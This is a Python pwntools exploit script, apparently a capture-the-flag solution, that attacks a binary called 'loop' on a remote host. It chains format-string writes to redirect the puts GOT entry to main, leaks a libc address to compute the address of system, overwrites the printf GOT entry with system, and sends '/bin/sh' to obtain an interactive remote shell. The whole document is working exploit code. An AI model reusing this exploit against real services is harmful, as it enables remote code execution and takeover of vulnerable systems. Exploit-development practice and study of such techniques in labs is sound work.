from pwn import *

debug = False

if debug:
    r = process("./loop")
    gdb.attach(r)
    offset_after_hook = 0x00000000003ed8e0
    system_offset = 0x000000000004f550
# else:
#     r = remote("45.77.245.244",5556)
#     offset_after_hook = 0x00000000003c67a0
#     system_offset = 0x0000000000045390
else:
    r = remote("192.168.0.130",9999)
    offset_after_hook = 0x00000000003ed8e0
    system_offset = 0x000000000004f550



print(r.recv())

puts_got = 0x0000000000601018
printf_got = 0x0000000000601028
main = 0x0000000000400805

payload = "%2053p%14$hnaaaa"+p64(puts_got)
r.sendline(payload)
print(r.recv())

payload1 = "%2$pg"
r.sendline(payload1)

if debug:
    mapped = r.recvuntil("g").split("Hello ")[1][:-1]
else:
    print(r.recv())
    mapped = r.recvuntil("g").split("Hello")[1][:15]
print("mapped " + mapped)

after_hook = int(mapped,16) + 32 # __after_morecore_hook
libc_base = after_hook - offset_after_hook
print("base " + hex(libc_base))

system_addr = libc_base + system_offset
print("system " + hex(system_addr))
system_addr_change1 = system_addr & 0xffff # 2 bytes sau
system_addr_change2 = (system_addr & 0xffff0000)/0x10000 # 2 bytes truoc

if (system_addr_change1 > system_addr_change2):
    payload2 = "%"+ str(system_addr_change2) +"p%16$hn" + "%"+ str(system_addr_change1 - system_addr_change2) +"p%17$hn"
    print(len(payload2))
    payload2 += "a"*(32-len(payload2)) +p64(printf_got+2) + p64(printf_got)
else:
    payload2 = "%"+ str(system_addr_change1) +"p%16$hn" + "%"+ str(system_addr_change2 - system_addr_change1) +"p%17$hn"
    print(len(payload2))
    payload2 += "a"*(32-len(payload2)) +p64(printf_got) + p64(printf_got+2)
r.sendline(payload2)
print(r.recv())

r.sendline("/bin/sh")

r.interactive()